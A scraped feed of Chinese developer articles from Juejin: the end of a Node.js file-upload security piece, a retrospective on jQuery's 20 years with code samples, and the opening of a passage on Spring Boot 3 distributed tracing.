<p>1️⃣ <strong>防止重复上传</strong></p>
<ul>
<li>• 计算文件 Hash（MD5 / SHA1）</li>
<li>• 相同文件直接复用</li>
</ul>
<p>2️⃣ <strong>大文件拆分上传</strong></p>
<ul>
<li>• 分片上传</li>
<li>• 断点续传</li>
</ul>
<p>3️⃣ <strong>上传目录隔离</strong></p>
<ul>
<li>• 禁止执行权限</li>
<li>• 防止文件直接被当作脚本执行</li>
</ul>
<p>4️⃣ <strong>CDN / 对象存储</strong></p>
<ul>
<li>• 阿里云 OSS、腾讯云 COS、S3</li>
<li>• 减轻服务器压力</li>
</ul>
<hr/>
<h2 data-id="heading-14">九、总结</h2>
<p>多文件上传与验证是 Node.js 后端开发中的高频需求，也是安全风险较高的模块之一。通过合理使用 Multer 中间件、严格的文件类型与大小校验，以及完善的错误处理机制，可以构建一个<strong>安全、稳定、可扩展的文件上传系统</strong>。</p>
<p>在《Node.js 编程实战》系列中，文件上传模块为后续的文件处理、资源管理、业务绑定打下了坚实基础。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[回首 jQuery 20 年：从辉煌到没落]]></title>    <link>https://juejin.cn/post/7597259271110246440</link>    <guid>https://juejin.cn/post/7597259271110246440</guid>    <pubDate>2026-01-20T10:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597259271110246440" data-draft-id="7597243334176882728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="回首 jQuery 20 年：从辉煌到没落"/> <meta itemprop="keywords" content="前端,JavaScript,jQuery"/> <meta itemprop="datePublished" content="2026-01-20T10:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            回首 jQuery 20 年：从辉煌到没落
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:53:20.000Z" title="Tue Jan 20 2026 10:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2006 年 1 月 14 日，John Resig 发布了名为 jQuery 的 JavaScript 库。</p>
<p><strong>至今已经过去了 20 年！</strong></p>
<p>20 周年之际，jQuery 4.0 正式发布了！</p>
<p>是的，就是那个被无数人宣布“已死”的 jQuery，经过 10 年的等待后迎来了重大更新。</p>
<p>更让人意想不到的是，根据 W3Techs 的数据，<strong>jQuery 仍然被全球 78% 的网站使用</strong>。</p>
<p>这个数字意味着什么？</p>
<p>在 React、Vue、Angular 等现代框架横行的今天，那个曾经被我们嫌弃“老掉牙”的 jQuery，依然在互联网的角落里默默发光发热。</p>
<p>从 2006 年 John Resig 在 BarCampNYC 大会上首次发布，到今天 4.0 版本的现代化重生，jQuery 走过了整整 20 年。</p>
<p><strong>它不仅是一个 JavaScript 库，更是一个时代的缩影，见证了前端技术从混沌到繁荣的完整历程。</strong></p>
<p>本篇让我们一起回顾 jQuery 的 20 年，见证它的辉煌与没落。</p>
<h2 data-id="heading-0">1. 混沌时代</h2>
<p>回望 2006 年，彼时正值第一次浏览器战争的尾声，微软 IE 与网景 Navigator 刚刚打完仗，但遗留下来的兼容性问题却让无数前端开发者头疼不已。</p>
<p>当时开发者需要面对各种浏览器的“奇技淫巧”，光是一个事件绑定就要写一大串兼容代码。</p>
<p>来看看这段早期的 jQuery 源码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 如果使用Mozilla</span>
<span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"mozilla"</span> || jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"opera"</span>) {
    jQuery.<span class="hljs-property">event</span>.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">document</span>, <span class="hljs-string">"DOMContentLoaded"</span>, jQuery.<span class="hljs-property">ready</span>);
}
<span class="hljs-comment">// 如果使用IE</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"msie"</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">"&lt;scr"</span> +=<span class="hljs-string">""</span> <span class="hljs-string">"ipt="</span><span class="hljs-string">" id="</span>__ie_init<span class="hljs-string">" defer="</span><span class="hljs-literal">true</span><span class="hljs-string">" "</span>=<span class="hljs-string">""</span> <span class="hljs-string">"src="</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">void</span>(<span class="hljs-number">0</span>)<span class="hljs-string">"&gt;&lt;\/script&gt;"</span>);
    <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"__ie_init"</span>);
    script.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) jQuery.<span class="hljs-title function_">ready</span>();
    };
}
<span class="hljs-comment">// 如果使用Safari</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"safari"</span>) {
    jQuery.<span class="hljs-property">safariTimer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"loaded"</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) {
            <span class="hljs-built_in">clearInterval</span>(jQuery.<span class="hljs-property">safariTimer</span>);
            jQuery.<span class="hljs-title function_">ready</span>();
        }
    }, <span class="hljs-number">10</span>);
}
&lt;/scr<span class="hljs-string">"&gt;

</span></code></pre>
<p>看到没？仅仅是处理页面加载事件就要写这么多兼容代码！这在今天是难以想象的。</p>
<h2 data-id="heading-1">2. 横空出世</h2>
<p>就在这时，jQuery 横空出世，彻底改变了游戏规则。</p>
<p>John Resig 提出了一个简单而优雅的理念：</p>
<blockquote>
<p><strong>Write Less，Do More</strong></p>
</blockquote>
<p>jQuery 通过精简常见的重复性任务，去除所有不必要的标记，使代码简洁、高效且易于理解，从而实现这一目标。</p>
<p>jQuery 带来了两大革命性改变：</p>
<ol>
<li><strong>强大的选择器引擎</strong>：不再局限于简单的 ID 和类选择，可以进行复杂的关系选择</li>
<li><strong>优雅的 API 设计</strong>：链式操作让代码既简洁又易读</li>
</ol>
<p>看看这个对比：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统DOM操作</span>
<span class="hljs-keyword">var</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"contacts"</span>).<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"ul"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">"people"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">var</span> items = elements[i].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"li"</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; items.<span class="hljs-property">length</span>; j++) {
    <span class="hljs-comment">// 操作每个item</span>
  }
}

<span class="hljs-comment">// jQuery方式</span>
$(<span class="hljs-string">"#contacts ul.people li"</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 操作每个item</span>
});
</code></pre>
<p>差距一目了然！</p>
<p>jQuery 的出现让前端开发变得如此优雅，以至于迅速在开发者群体中传播开来。</p>
<h2 data-id="heading-2">3. 辉煌岁月</h2>
<p>随着 jQuery 的普及，一个庞大的插件生态迅速建立起来。</p>
<p>从日期选择器到轮播图，从表单验证到动画效果，几乎你能想到的功能都有对应的 jQuery 插件。</p>
<p>那时候前端开发的标准流程是：</p>
<ol>
<li>下载 jQuery 核心库</li>
<li>搜索并下载所需的 jQuery 插件</li>
<li>组合这些插件完成项目</li>
</ol>
<p>同时，jQuery 的管理也变得正式。</p>
<p>2011 年，jQuery 团队正式成立了 jQuery 理事会。2012 年，jQuery 理事会成立了 jQuery 基金会。</p>
<h2 data-id="heading-3">4. 影响深远</h2>
<p>jQuery 的影响力远远超出了技术本身，它推动了整个前端行业的发展：</p>
<ul>
<li>**大幅降低了前端开发的门槛：**让更多的开发者能够参与到前端开发中来</li>
<li><strong>提升了前端工程师的社会地位</strong>：让前端开发变得更加专业和重要</li>
<li><strong>促进了浏览器厂商的标准化</strong>：jQuery 的成功证明了统一 API 的重要性</li>
<li><strong>催生了现代前端工具链</strong>：为后来的模块化、构建工具奠定了基础</li>
</ul>
<p>甚至连 jQuery 的选择器引擎 Sizzle 后来都被提取出来，影响了整个选择器标准的发展。</p>
<h2 data-id="heading-4">5. 价值动摇</h2>
<p>jQuery 之所以能够快速普及，很大程度上是因为浏览器的“不争气”。</p>
<p>而当浏览器厂商开始认真对待标准化问题时，jQuery 的核心价值就开始动摇了。</p>
<p>2009 年后，浏览器标准化进程大幅加速：</p>
<ul>
<li><code>querySelector</code>和<code>querySelectorAll</code>的出现</li>
<li><code>classList</code> API 的普及</li>
<li><code>fetch</code> API 替代 Ajax 需求</li>
<li>CSS3 动画替代 JavaScript 动画</li>
</ul>
<p>现代浏览器 API 的完善，让很多 jQuery 功能都有了原生替代品：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// jQuery方式</span>
$(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> $(<span class="hljs-string">"#box"</span>).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">"active"</span>));

<span class="hljs-comment">// 原生方式</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#box"</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">"active"</span>);
});
</code></pre>
<p>你可以发现，差距已经不再那么明显！</p>
<h2 data-id="heading-5">6. 框架打击</h2>
<p>2010 年，React、Angular、Vue 等现代框架相继登场，带来了革命性的变化：</p>
<ol>
<li><strong>组件化思维</strong>：从 DOM 操作转向组件构建</li>
<li><strong>声明式编程</strong>：描述“什么”而不是“如何”</li>
<li><strong>状态管理</strong>：解决了复杂应用的维护问题</li>
<li><strong>工具链完善</strong>：从构建到部署的完整解决方案</li>
</ol>
<p>这些框架从架构层面解决了 jQuery 时代的问题，就像从手工制作转向了工业化生产。</p>
<h2 data-id="heading-6">7. 惨遭背叛</h2>
<p>2018 年，GitHub 公开宣布从其前端移除 jQuery，这个标志性事件被广泛解读为“jQuery 时代的终结”。</p>
<p>GitHub 在博客中详细说明了迁移的理由：现代浏览器 API 已经足够完善，React 的组件化模式更适合大型应用的维护。</p>
<p>这个“背叛”对 jQuery 的声誉造成了重大打击，也加速了它在新技术栈中的衰落。</p>
<h2 data-id="heading-7">8. 瘦死骆驼</h2>
<p>尽管在技术前沿领域失势，但 jQuery 在<strong>存量市场</strong>中的地位依然稳固：</p>
<ul>
<li><strong>78% 的顶级网站</strong>仍在使用 jQuery</li>
<li><strong>WordPress 等 CMS 系统</strong>大量依赖 jQuery</li>
<li><strong>企业级应用</strong>中 jQuery 代码基数庞大</li>
</ul>
<p>为什么企业不直接抛弃 jQuery？</p>
<p>因为现实远比理想复杂：</p>
<ol>
<li><strong>业务逻辑与 DOM 深度耦合</strong>：重构成本巨大</li>
<li><strong>第三方插件依赖</strong>：很多插件没有现代替代方案</li>
<li><strong>迁移风险</strong>：新功能开发受阻，影响营收</li>
<li><strong>技能断层</strong>：团队对旧技术熟悉，对新技术陌生</li>
</ol>
<p>比如一个电商网站如果要重构支付流程的 jQuery 代码，任何 bug 都可能导致直接的经济损失。这种风险评估让很多公司望而却步。</p>
<p>此外，WordPress 支撑着全球 43% 的网站，它的核心仍然依赖 jQuery。这个庞大的生态系统意味着：</p>
<ul>
<li>数十万主题和插件依赖 jQuery</li>
<li>内容管理系统对稳定性的要求远超先进性</li>
<li>托管服务商倾向于保持现有技术栈</li>
</ul>
<p>所以即使所有前端开发者都不再使用 jQuery，仅 WordPress 生态系统就能让它继续存在很多年。</p>
<h2 data-id="heading-8">9. 拥抱现代</h2>
<p>2026 年 1 月 17 日，<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhNEPf_5qbiM4W9HGgfzMQ" target="_blank" title="https://mp.weixin.qq.com/s/XhNEPf_5qbiM4W9HGgfzMQ" ref="nofollow noopener noreferrer">jQuery 4.0 正式发布</a>，在这次发布中：</p>
<ul>
<li><strong>移除对 IE11 以下版本的支持</strong>：摆脱历史包袱</li>
<li><strong>迁移到 ES 模块</strong>：与现代构建工具兼容</li>
<li><strong>增加 Trusted Types 支持</strong>：提升安全性</li>
<li><strong>移除已弃用 API</strong>：清理技术债务</li>
</ul>
<p>这次更新像是 jQuery 面向现代 Web 的断舍离。</p>
<h2 data-id="heading-9">10. 结语：一个时代的完结</h2>
<p>jQuery 20 年的发展史，就是一部前端技术的缩影。</p>
<p>它从解决现实问题出发，推动了整个行业的发展，最终也随着时代的变化而淡出主流。</p>
<p>这并不意味着 jQuery 是失败的。恰恰相反，<strong>它超额完成了自己的历史使命</strong>：</p>
<ul>
<li>它让无数人学会了前端开发</li>
<li>它推动了浏览器厂商的标准化</li>
<li>它催生了现代前端生态</li>
<li>它证明了开源协作的力量</li>
</ul>
<p>正如那句经典的台词：<strong>“并不是英雄迟暮，而是时代需要新的英雄。”</strong></p>
<p>jQuery 4.0 的发布不是回光返照，它告诉我们：<strong>技术没有绝对的对错，只有是否适合那个时代的需求</strong>。</p>
<p>今天，当我们在 React、Vue 的组件化世界中忙碌时，偶尔回望一下 jQuery 的简单优雅，也许能获得一些关于<strong>技术本质</strong>的思考：</p>
<p><strong>好的工具应该让人更专注于创造价值，而不是被技术本身所困扰。</strong></p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从原理到抽象：Spring Boot 3 链路追踪深度解析]]></title>    <link>https://juejin.cn/post/7596874392824283178</link>    <guid>https://juejin.cn/post/7596874392824283178</guid>    <pubDate>2026-01-19T07:38:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596874392824283178" data-draft-id="7596874392824266794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从原理到抽象：Spring Boot 3 链路追踪深度解析"/> <meta itemprop="keywords" content="后端,架构,微服务"/> <meta itemprop="datePublished" content="2026-01-19T07:38:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从原理到抽象：Spring Boot 3 链路追踪深度解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T07:38:48.000Z" title="Mon Jan 19 2026 07:38:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    28
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在上一篇文章<a href="https://juejin.cn/post/7583325900294717440" target="_blank" title="https://juejin.cn/post/7583325900294717440">《告别手写 TraceId！Micrometer 链路追踪在 Spring Boot 中的落地实践》</a>中，我们详细介绍了如何使用 Spring Boot 3 + Micrometer Tracing 实现分布式链路追踪，包括 OpenFeign、RestTemplate、异步调用三种场景的完整配置和验证。</p>
<p>那篇文章解决了"怎么做"的问题，但如果你想真正理解：</p>
<ul>
<li>为什么 Micrometer 能自动传递 TraceId？</li>
<li>RestTemplate、OpenFeign、异步调用的传播机制有什么共性？</li>
<li>W3C Trace Context 标准是如何工作的？</li>
<li>Micrometer 的设计思想是什么？</li>
</ul>
<p>那么这篇文章将从<strong>原理层面</strong>和<strong>抽象层面</strong>给你答案。</p>
<h2 data-id="heading-1">一、问题的起点：微服务调用链中的盲区</h2>
<p>在微服务架构中，一个用户请求往往会经过多个服务：</p>
